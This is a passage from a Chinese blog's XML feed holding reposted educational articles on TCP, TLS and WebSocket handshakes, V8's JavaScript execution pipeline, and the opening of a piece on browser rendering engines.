    <updated>2023-03-05T13:32:12.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-不止一种握手"><a href="#1-不止一种握手" class="headerlink" title="1. 不止一种握手"></a>1. 不止一种握手</h2><p>在早期的网络传输中，也就存在<code>TCP</code>协议需要“握手”的过程，但早期的协议有一个缺陷：通信只能由客户端发起，做不到服务器主动向客户端推送信息。 <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e16feeb3bc07~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>于是<code>WebSocket</code> 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p><p>而随着<code>SSL/TLS</code>的完善，存在已久的安全版网络协议：<code>HTTPS</code>也是迸发式发展。</p><p>最后前端领域的协议握手便成了三分天下：</p><ol><li><code>TCP</code>三次握手，归<code>HTTP</code>。</li><li><code>TLS</code>握手，归<code>HTTPS</code></li><li><code>WebSocket</code>握手，基于<code>TCP</code>协议，都能用。</li></ol><h2 id="2-TCP三次握手的终极意义"><a href="#2-TCP三次握手的终极意义" class="headerlink" title="2. TCP三次握手的终极意义"></a>2. <code>TCP</code>三次握手的终极意义</h2><p>在我之前的文章：<a href="https://juejin.cn/post/6844903826747555847#heading-5">《「真香警告」重学 TCP/IP 协议 与三次握手 》</a></p><p>也详细的讲述过<code>TCP</code>三次握手，但那时我未明确意识到其深刻含义。</p><p>就和大家一样，只在面试前会记得，过后即忘。</p><p>直到我看到《网络是怎样连接的》中的一段话：</p><blockquote><p>**在实际的通信中，序号并不是从 1 开始的，而是需要用随机数计算出一个初始值，这是因为</p></blockquote><p>如果序号都从 1 开始，通信过程就会非常容易预测，有人会利用这一点来发动攻击。**</p><blockquote><p>**但是如果初始值是随机的，那么对方就搞不清楚序号到底是从</p></blockquote><p>多少开始计算的，因此需要在开始收发数据之前将初始值告知通信对象。**</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191f9707864302~tplv-t2oaga2asx-watermark.awebp" alt="img"> 你品，你细品。三次握手不就是相互试探暗号，来确定是不是对的人吗？</p><h3 id="2-1-知识补充：一个网络包的最大长度"><a href="#2-1-知识补充：一个网络包的最大长度" class="headerlink" title="2.1 知识补充：一个网络包的最大长度"></a>2.1 知识补充：一个网络包的最大长度</h3><p>计算每个网络包能容纳的数据长度，协议栈会根据一个叫作 <code>MTU</code>的参数来进行判断。</p><p><code>MTU</code>表示一个网络包的最大长度，在以太网中一般是<code>1500</code>字节</p><p><strong><code>MTU</code>是包含头部的总长度，因此需要从<code>MTU</code>减去头部的长度，然后得到的长度就是一个网络包中所能容纳的最大数据长度，这一长度叫作<code>MSS</code>。</strong></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e41fba84d417~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1718e4a3dd3e16d2~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>由上两图可知，<code>MSS</code>值是<code>1460（1500-40）</code>字节，其中：</p><ol><li><code>TCP</code>固定头部<code>20</code>字节。</li><li><code>IP</code>固定头部<code>20</code>字节。</li><li><code>TCP</code>头部最长可以达到<code>60</code>字节。</li></ol><h2 id="3-TLS握手：HTTPS的核心"><a href="#3-TLS握手：HTTPS的核心" class="headerlink" title="3. TLS握手：HTTPS的核心"></a>3. <code>TLS</code>握手：<code>HTTPS</code>的核心</h2><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171913443ba4ec19~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><blockquote><p><code>HTTPS</code> 其实是一个“非常简单”的协议，<code>RFC</code> 文档很小，只有短短的 7 页，里面规定了新的协议名“<code>https</code>”，默认端口号 443，至于其他的什么请求 - 应答模式、报文结构、请求方法、<code>URI</code>、头字段、连接管理等等都完全沿用 <code>HTTP</code>，没有任何新的东西。—- 《透视<code>HTTP</code>协议》</p></blockquote><p>感兴趣的可以到这里看看：链接：<a href="https://link.juejin.cn/?target=https://tools.ietf.org/html/rfc2818">tools.ietf.org/html/rfc281…</a></p><h3 id="3-1-TLS-SSL究竟是啥？"><a href="#3-1-TLS-SSL究竟是啥？" class="headerlink" title="3.1 TLS/SSL究竟是啥？"></a>3.1 <code>TLS/SSL</code>究竟是啥？</h3><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1719134b3a7fbc68~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>很多人看到<code>TLS/SSL</code>这对词就开始蒙圈了。实际上，这两个东西是一个玩意儿：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1719135d5152b0b0~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>1999</code> 年改名：**<code>SSL 3 === TLS 1.0</code>**</p><p>目前运用最广泛的是<code>TLS 1.2</code>:</p><blockquote><p><code>TLS</code> 由记录协议、握手协议、警告协议、变更密码规范协议、扩展协议等几个子协议组成，综合使用了对称加密、非对称加密、身份认证等许多密码学前沿技术。</p></blockquote><p>由于<code>TLS/SSL</code> 协议位于应用层和传输层 TCP 协议之间。<code>TLS</code> 粗略的划分又可以分为 2 层：</p><ol><li>靠近应用层的握手协议 <code>TLS Handshaking Protocols</code></li><li>靠近 TCP 的记录层协议 <code>TLS Record Protocol</code></li></ol><p>这个篇幅展开来写就太多了，我们先关心下<code>TLS</code>握手吧。</p><h3 id="3-2-TLS握手详解"><a href="#3-2-TLS握手详解" class="headerlink" title="3.2 TLS握手详解"></a>3.2 <code>TLS</code>握手详解</h3><p><strong>TLS握手何时发生？：</strong></p><ol><li>每当用户通过<code>HTTPS</code>导航到网站并且浏览器首先开始查询网站的原始服务器时，就会进行<code>TLS</code>握手。</li><li>每当其他任何通信使用<code>HTTPS</code>（包括<code>API</code>调用和<code>HTTPS</code>查询上的DNS）时，也会发生<code>TLS</code>握手。</li><li>通过TCP握手打开TCP连接后，会发生<code>TLS</code> 握手。</li></ol><p> <strong>TLS握手期间会发生什么？</strong></p><p>在<code>TLS</code>握手过程中，客户端和服务器将共同执行以下操作：</p><ul><li>指定将使用的TLS版本（TLS 1.0、1.2、1.3等）</li><li>确定将使用哪些加密套件。</li><li>通过服务器的公钥和SSL证书颁发机构的数字签名来验证服务器的身份</li><li>握手完成后，生成会话密钥以使用对称加密</li></ul><p><strong>加密套件决定握手方式：</strong>：</p><blockquote><p><a href="https://link.juejin.cn/?target=https://razeencheng.com/post/ssl-handshake-detail">摘自：《HTTPS篇之SSL握手过程详解》</a></p></blockquote><p>在<code>TLS</code>中有两种主要的握手类型：一种基于<code>RSA</code>，一种基于<code>Diffie-Hellman</code>。 这两种握手类型的主要区别在于主秘钥交换和认证上。</p><table><thead><tr><th></th><th>秘钥交换</th><th>身份验证</th></tr></thead><tbody><tr><td>RSA握手</td><td>RSA</td><td>RSA</td></tr><tr><td>DH握手</td><td>DH</td><td>RSA/DSA</td></tr></tbody></table><p>主流的握手类型，基本都是基于<code>RSA</code>，所以以下讲解都基于<code> RSA</code>版握手。</p><p>整个流程如下图所示： <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171914a65c74d7b8~tplv-t2oaga2asx-watermark.awebp" alt="img"> 具体流程描述：</p><ol><li>客户端<code>hello</code>：客户端通过向服务器发送“问候”消息来发起握手。该消息将包括客户端支持的TLS版本，支持的加密套件以及称为“客户端随机”的随机字节字符串。</li><li>服务器<code>hello</code>：为回复客户端<code>hello</code>消息，服务器发送一条消息，其中包含服务器的<code>SSL</code>证书，服务器选择的加密套件和“服务器随机数”，即服务器生成的另一个随机字节串。</li><li>客户端发送公钥加密的预主密钥。</li><li>服务器用自己的私钥解密加密的预主密钥。<ul><li>客户端<code>finished</code>：客户端发送“完成”消息，该消息已用会话密钥加密。</li><li>服务器<code>finished</code>：服务器发送一条用会话密钥加密的“完成”消息。</li></ul></li><li>握手完成，后续通过主密钥加解密。</li></ol><h2 id="4-WebSocket握手"><a href="#4-WebSocket握手" class="headerlink" title="4. WebSocket握手"></a>4. <code>WebSocket</code>握手</h2><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191b816c90c262~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>WebSocket</code>协议实现起来相对简单。它使用<code>HTTP</code>协议进行初始握手。成功握手之后，就建立了连接，<code>WebSocket</code>基本上使用原始TCP读取/写入数据。</p><p>《图解<code>HTTP</code>》一书中的图讲的比较清楚：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191b98130ee558~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>具体步骤表现是：</p><ol><li>客户端请求：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  GET &#x2F;chat HTTP&#x2F;1.1     </span><br><span class="line">Host: server.example.com     </span><br><span class="line">Upgrade: websocket     </span><br><span class="line">Connection: Upgrade     </span><br><span class="line">Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw&#x3D;&#x3D;     </span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat     </span><br><span class="line">Sec-WebSocket-Version: 13     </span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com</span><br></pre></td></tr></table></figure><ol><li>服务端响应：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    HTTP&#x2F;1.1 101 </span><br><span class="line">Switching Protocols     </span><br><span class="line">Upgrade: websocket     </span><br><span class="line">Connection: Upgrade     </span><br><span class="line">Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk&#x3D;     </span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure><h3 id="4-1-Websocket全双工通信"><a href="#4-1-Websocket全双工通信" class="headerlink" title="4.1 Websocket全双工通信"></a>4.1 <code>Websocket</code>全双工通信</h3><p><code>Websocket</code>协议解决了服务器与客户端全双工通信的问题。</p><p><strong>那什么是单工、半双工、全双工通信？</strong></p><table><thead><tr><th>类型</th><th>能力</th></tr></thead><tbody><tr><td>单工</td><td>信息单向传送</td></tr><tr><td>半双工</td><td>信息能双向传送，但不能同时双向传送</td></tr><tr><td>全双工</td><td>信息能够同时双向传送</td></tr></tbody></table><h3 id="4-2-Websocket和Socket区别"><a href="#4-2-Websocket和Socket区别" class="headerlink" title="4.2 Websocket和Socket区别"></a>4.2 <code>Websocket</code>和<code>Socket</code>区别</h3><p><strong>可以把<code>WebSocket</code>想象成<code>HTTP</code>应用层)，<code>HTTP</code>和<code>Socket</code>什么关系，<code>WebSocket</code>和<code>Socket</code>就是什么关系。</strong></p><h4 id="1-WebSocket与HTTP的关系"><a href="#1-WebSocket与HTTP的关系" class="headerlink" title="1. WebSocket与HTTP的关系"></a>1. <strong><code>WebSocket</code>与<code>HTTP</code>的关系</strong></h4><p>相同点</p><ol><li>都是一样基于<code>TCP</code>的，都是可靠性传输协议。</li><li>都是应用层协议。</li></ol><p>不同点</p><ol><li><code>WebSocket</code>是双向通信协议，模拟<code>Socket</code>协议，可以双向发送或接受信息。<code>HTTP</code>是单向的。</li><li><code>WebSocket</code>是需要握手进行建立连接的。</li></ol><h4 id="2-Socket是什么？"><a href="#2-Socket是什么？" class="headerlink" title="2. Socket是什么？"></a>2. <strong><code>Socket</code>是什么？</strong></h4><p><code>Socket</code>是应用层与<code>TCP/IP</code>协议族通信的中间软件抽象层，它是一组接口。</p><p>在设计模式中，<code>Socket</code>其实就是一个门面模式，它把复杂的<code>TCP/IP</code>协议族隐藏在<code>Socket</code>接口后面，对用户来说，一组简单的接口就是全部，让<code>Socket</code>去组织数据，以符合指定的协议。</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191cb5e0ccc912~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><h3 id="4-3-扩展知识：Socket-IO的七层降级"><a href="#4-3-扩展知识：Socket-IO的七层降级" class="headerlink" title="4.3 扩展知识：Socket.IO的七层降级"></a>4.3 扩展知识：<code>Socket.IO</code>的七层降级</h3><p>在<code>Golang</code>、<code>Java Spring</code>等框架中，<code>websocket</code>都有一套实现<code>API</code>。 <img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191bd710411ade~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p><code>Socket.IO</code> 由两部分组成：</p><ol><li>一个服务端用于集成 (或挂载) 到 <code>Node.JS HTTP</code> 服务器： <code>socket.io</code></li><li>一个加载到浏览器中的客户端： <code>socket.io-client</code></li></ol><p>很多人以为<code>Socket.IO</code>只是<code>WebSocket</code>和<code>XHR</code>长轮询。</p><p>实际上，<code>Socket.io</code>有很多传输机制:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. WebSockets </span><br><span class="line">2. FlashSocket </span><br><span class="line">3. XHR长轮询</span><br><span class="line">4. XHR部分流：multipart&#x2F;form-data</span><br><span class="line">5. XHR轮询</span><br><span class="line">6. JSONP轮询</span><br><span class="line">7. iframe</span><br></pre></td></tr></table></figure><p>得益于这么多种传输机制，<code>Socket.io</code>兼容性完全不用担心。</p><h2 id="5-扩展：HTTPS-与HTTP-核心区别"><a href="#5-扩展：HTTPS-与HTTP-核心区别" class="headerlink" title="5. 扩展：HTTPS 与HTTP 核心区别"></a>5. 扩展：<code>HTTPS</code> 与<code>HTTP</code> 核心区别</h2><p>上面讲到 <strong><code>Socket</code>是什么？</strong>，有一点我忘了讲：</p><p><code>HTTPS</code> 与<code>HTTP</code> 核心区别在于两点：</p><ol><li>把 <code>HTTP</code> 下层的传输协议由 <code>TCP/IP</code> 换成了 <code>SSL/TLS</code></li><li>收发报文不再使用 <code>Socket API</code>，而是调用专门的安全接口。</li></ol><p>具体区别：</p><ol><li><code>HTTPS</code>协议需要到<code>CA</code>申请证书，一般免费证书很少，需要交费。</li><li><code>HTTP</code>是超文本传输协议，信息是明文传输，<code>HTTPS</code> 则是具有安全性的ssl加密传输协议。</li><li><code>HTTP</code>和<code>https</code>使用的是完全不同的连接方式，用的端口也不一样,前者是<code>80</code>,后者是<code>443</code>。</li><li><code>HTTP</code>的连接很简单,是无状态的。<code>HTTPS</code>协议是由<code>SSL+HTTP</code>协议构建的可进行加密传输、身份认证的网络协议，比<code>HTTP</code>协议安全。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.cn/post/6844904132071948295#heading-2">面试官问到三次握手，我甩出这张脑图，他服了！</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>v8 执行 js 的过程</title>
    <link href="http://aiolimp.com/2021/08/10/v8%E6%89%A7%E8%A1%8Cjs%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
    <id>http://aiolimp.com/2021/08/10/v8%E6%89%A7%E8%A1%8Cjs%E7%9A%84%E8%BF%87%E7%A8%8B/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.213Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="v8-执行-js-的过程"><a href="#v8-执行-js-的过程" class="headerlink" title="v8 执行 js 的过程"></a>v8 执行 js 的过程</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文意在简单的介绍一下 V8 执行 JS 的过程，通过了解 V8 执行 JS 的过程，知道 JS 代码呈现在浏览器上到底做了什么。当然本人也是在陆续探索 V8 ，文章中如有不当之处，还望不吝指正，理性交流。</p><p>众所周知，机器（CPU）只能识别机器码（二进制码），对于 JS 代码，它是识别不了的，所以当代码成为页面出现在屏幕上的时候，必然是做了很多的转译工作。</p><h2 id="V8-执行-Javascript-过程"><a href="#V8-执行-Javascript-过程" class="headerlink" title="V8 执行 Javascript 过程"></a>V8 执行 Javascript 过程</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c22fdb3bf7c6441091d97e4808918ef3~tplv-k3u1fbpfcp-zoom-1.image" alt="img"></p><p>如上图所示，我们将一步步进行拆分分析：</p><h3 id="JS-TO-AST"><a href="#JS-TO-AST" class="headerlink" title="JS TO AST"></a>JS TO AST</h3><p>在 V8 引擎拿到 JS 代码之后，<strong>解析器</strong>（Parser）会对其进行词法分析和语法分析。</p><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p>将 JS 代码拆分成对应的 Token，Token 是能拆分的最小单位，固定 type 表述类型/属性，value 表示对应的值，如下图 Token。</p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p>在进行词法分析转为 Token 之后，解析器继续根据生成的 Token 生成对应的 AST，AST 相信前端同学并不陌生，也是热词之一，无论是在 Vue、React 中虚拟 DOM 的表示，或者 Babel 对 JS 转译的表示都是先将其转化为对应的 AST，解析器解析之后的 AST 结构如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43af5a528db34860901cbb5c03d1fc10~tplv-k3u1fbpfcp-zoom-1.image" alt="img"></p><p>可以看到，一段极小的代码片段，被解析成 AST 之后复杂了很多，在图中的 AST 还仅仅是简化后的数据，全部的 AST 其实还有很多参数，将会更复杂。</p><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>在解析器（Parser）将 JS 代码解析成 AST 之后，<strong>解释器</strong>（Ignition）根据 AST 来生成字节码（也称中间码）。前文提到 CPU 只能识别机器码，对字节码是识别不了的，这里就衍生出一个问题，如果 CPU 识别不了字节码，那为什么还要在中间插一步来耗费资源转字节码呢？效率不是很更低吗？</p><p>在计算机学科里聊效率，都逃避不了时间和空间这两个概念，绝大部分的优化都是空间换时间和时间换空间，两者的平衡，效率如何达到最高，是一个很值得深入研究的问题。</p><p>拿之前版本的 V8 引擎执行 JS 来说，是没有转字节码这一步骤的，直接从 AST 转成机器码，这个过程称为编译过程，所以每次拿到 JS 文件的时候，首先都会编译，而这个过程还是比较浪费时间的，这是一件比较头疼的事情，需要一个解决办法。</p><p>一个网页第一次打开，关闭再次去打开，大部分情况下，还是和原来 JS 文件一致的，除非开发者修改了代码，但这个可以暂时不考虑，毕竟哪个网站也不会一天闲的无聊，不停的修改，上传替换。</p><h4 id="缓存机器码"><a href="#缓存机器码" class="headerlink" title="缓存机器码"></a>缓存机器码</h4><p>按照这个思路，既然绝大多数情况下，文件不会修改，那编译后的机器码可以考虑缓存下来，这样一来，下次再打开或者刷新页面的时候就省去编译的过程了，可以直接执行了，存储机器码被分成了两种情况，一个是浏览器未关闭时候，直接存储到浏览器本地的内存中，一个是浏览器关闭了，直接存储在磁盘上，而早期的 V8 也确实是这么做的，典型的牺牲空间换时间。</p><h4 id="缓存带来的问题"><a href="#缓存带来的问题" class="headerlink" title="缓存带来的问题"></a>缓存带来的问题</h4><p>思考一个问题，从上面的图中可以看到，一个很小的代码片段，转换成 AST 之后，变大了很多，文件大了导致一个问题就是需要更大的内存来存储，而 JS 文件转成机器码（即二进制文件），会比原来的 JS 文件大几百甚至几千倍，这就意味这一个几十 KB 的 JS 文件将会达到几十 MB，这就很可怕，本来 Chrome 多进程架构就已经很占用内存了，再来这一出，配置再好的电脑，也怕是无福消受 Chrome 了，毕竟使用者体验的好坏，直接决定了一个产品在市场上是否能生存下去，尽管 V8 缓存了编译后的代码，减少了编译的时间，提高了时间上的效率，但代价是内存占用太大了，所以 Chrome 团队是有必要优化这个问题的。</p><h4 id="惰性编译"><a href="#惰性编译" class="headerlink" title="惰性编译"></a>惰性编译</h4><p>当然，引进其他技术是需要时间去开发和优化的，在一个技术架构产生的同时，必然会有劣势方面的弥补，而早期版本的 V8 为了解决占用内存和启动速度，引进了<strong>惰性编译</strong>，那么问题来了，<strong>惰性编译</strong>做了什么去提高效率的呢？</p><p><strong>惰性编译</strong>还是比较容易理解的，从作用域的角度思考，ES6 之前之只有全局作用域和函数作用域，而<strong>惰性编译</strong>的思路就是 V8 启动的时候只编译和缓存全局作用域的代码，而函数作用域中的代码，会在调用的时候去编译，同样函数内部编译后的代码一样不会被缓存下来。</p><h4 id="惰性编译存在的问题"><a href="#惰性编译存在的问题" class="headerlink" title="惰性编译存在的问题"></a>惰性编译存在的问题</h4><p>引入<strong>惰性编译</strong>之后，在编译速度和缓存上看来，都得到了提升，一切看起来似乎很完美了，对，是看起来，但是设计出来的东西，你永远不知道使用者会怎么使用，在 ES6 和 Vue、React 等这些没有普及之前，绝大部分开发者都使用的是 jQuery，以及 RequireJS 等类似产品，JQ 插件各种引用，各种插件或者开发者自己封装的方法，为了不污染其他使用者的变量，一般都封装成一个函数，这样问题就来了，<strong>惰性编译</strong>不会保存函数编译后的机器码和理解编译函数，如果一个插件太大那等到使用函数再去编译，编译的时间上就会变得很慢，这相当于是开发者将<strong>惰性编译</strong>给玩完了，路给封死了。</p><h4 id="引入字节码"><a href="#引入字节码" class="headerlink" title="引入字节码"></a>引入字节码</h4><p>好吧，玩不过开发者了，那 V8 团队只好换个思路，就引入字节码吧。首先要理解什么是字节码，字节码其实是机器码的抽象，各种字节码的相互构成，可以实现 JS 所需的所有功能，当然首先一点，字节码比机器码占用的内存要小很多很多，基本是机器码所在内存的几十甚至几百分之一，这样一来字节码缓存下来所消耗的内存还是可以接受的。</p><p>这里会有一个疑问，既然 CPU 不能识别字节码，那是不是还需要将字节码转成机器码呢？不然怎么执行，答案是肯定。解释在将 AST 转为字节码之后，会在执行的时候将字节码转成机器码，这个执行过程肯定是比直接执行机器码要慢的，所以在执行方面，速度上会比较慢，但是 JS 源码通过解析器转 AST，然后再通过解释器转字节码，这个过程是比编译器直接将 JS 源码转机器码要快很多的，全流程看来，整个时间上是差不了多少的，但是却减小了大量的内存占用，何乐而不为。</p><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><h4 id="热代码"><a href="#热代码" class="headerlink" title="热代码"></a>热代码</h4><p>在代码中，常常会有同一部分代码，被多次调用，同一部分代码如果每次都需要解释器转二进制代码再去执行，效率上来说，会有些浪费，所以在 V8 模块中会有专门的监控模块，来监控同一代码是否多次被调用，如果被多次调用，那么就会被标记为<strong>热代码</strong>，这有什么作用呢？</p><h4 id="优化编译器"><a href="#优化编译器" class="headerlink" title="优化编译器"></a>优化编译器</h4><p><strong>TurboFan</strong> (优化编译器) 这个词相信关注手机界的同学并不陌生，华为、小米等这些品牌，在近几年产品发布会上都会出现这个词，主要的能力是通过软件计算能力来优化一系列的功能，使得效率更优。</p><p>接着热代码继续说，当存在热代码的时候，V8 会借着 TurboFan 将为热代码的字节码转为机器码并缓存下来，这样一来，当再次调用热代码时，就不在需要将字节码转机器码，当然热代码相对来说还是少部分的，所以缓存也并不会占用太大内存，并且提升了执行效率，同样此处也是牺牲空间换时间。</p><h4 id="反优化"><a href="#反优化" class="headerlink" title="反优化"></a>反优化</h4><p>JS 语言是动态语言，非常之灵活，对象的结构和属性在运行时是可以发生改变的，设想一个问题，如果热代码在某次执行的时候，突然其中的某个属性被修改了，那么编译成机器码的热代码还能继续执行吗？答案是肯定不能。这个时候就要使用到优化编译器的<strong>反优化</strong>了，他会将热代码退回到 AST 这一步，这个时候解释器会重新解释执行被修改的代码，如果代码再次被标记为热代码，那么会重复执行优化编译器的这个步骤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从分析的过程来看，V8 对 JS 执行的过程，不仅使用到了解释器，还用到了优化编译器。这种两者结合去处理的方式，业界称为 JIT (Just-In-Time)。使用这种结合的方式来处理 JS，主要是利用了 AST 形成的文件较小，而通过优化编译器编译后的热代码执行效率高，两者结合，各自发挥各自的优势，将效率尽量提升到最大。</p><p>V8 所做的事情，远远不止这些，这里也仅仅是简单概况和分析一下主流程上所做的一些事情，如果细化到每个点，还有很多概念，比如内联缓存、隐藏类、快属性、慢属性、创建对象，以及笔者之前写的<a href="https://juejin.cn/post/6909239354418266119">垃圾回收</a>等等，所做的事情实在太多，就不一一例举了。</p><p>转载至<a href="https://juejin.cn/post/6971586506011967519">https://juejin.cn/post/6971586506011967519</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/categories/V8%E5%BC%95%E6%93%8E/"/>
    
    
    <category term="V8引擎" scheme="http://aiolimp.com/tags/V8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>一个浏览器是如何工作的（一）</title>
    <link href="http://aiolimp.com/2021/08/10/%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84(%E4%B8%80)/"/>
    <id>http://aiolimp.com/2021/08/10/%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84(%E4%B8%80)/</id>
    <published>2021-08-10T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h1><h3 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h3><p><strong>渲染引擎</strong>又名<strong>浏览器内核</strong>，指负责对网页语法解析并渲染成一张可视化页面的解析器。它是浏览器最核心最重要的部位，不同内核对网页语法的解析也有不同，因此同一网页语法在不同内核的浏览器中的渲染效果也可能不同，这就是常说的<strong>浏览器差异性</strong>。</p><p>上述提到的世界五大浏览器，在自身的发展过程中都使用了一种或多种浏览器内核作为自身的渲染引擎。</p><ul><li> <strong>Google Chrome</strong>：Webkit(前期)、Blink(后期)</li><li> <strong>Apple Safari</strong>：Webkit</li><li> <strong>Mozilla Firefox</strong>：Gecko</li><li> <strong>ASA Opera</strong>：Presto(前期)、Blink(后期)</li><li> <strong>Microsoft IExplorer</strong>：Trident</li><li> <strong>Microsoft Edge</strong>：Trident(前期)、Blink(后期)</li></ul><p>因此20多年的浏览器发展史里，被大规模使用的浏览器内核也就这五个。</p><ul><li> <strong>Blink内核</strong>：由谷歌公司和欧朋公司合作自研的内核，同时谷歌公司也将其作为开源内核架构<code>Chromium</code>的一部分发布，在<code>Chrome 28+</code>和<code>Opear 15+</code>中被使用。</li><li> <strong>Webkit内核</strong>：由苹果公司自研的内核，同时也是<code>Blink内核</code>的原型，在<code>Chrome 1 ~ 28</code>和<code>Safari 1+</code>中被使用。</li><li> <strong>Gecko内核</strong>：由网景公司自研的内核，先期在<code>Navigator</code>中使用，后期推广到<code>Firefox</code>上，在<code>Firefox 1+</code>中被使用。</li><li> <strong>Presto内核</strong>：由欧朋公司自研的内核，其渲染性能达到极致但牺牲了兼容性，目前已经废弃，在<code>Opear 7 ~ 14</code>中被使用。</li><li> <strong>Trident内核</strong>：由微软公司自研的内核，由于其被包含在全世界使用率最高的<code>Windows操作系统</code>中，导致十多年时间里一直称霸浏览器内核界，在<code>IExplorer 4+</code>中被使用。</li></ul><h3 id="渲染过程"><a href="#渲染过程" class="headerlink" 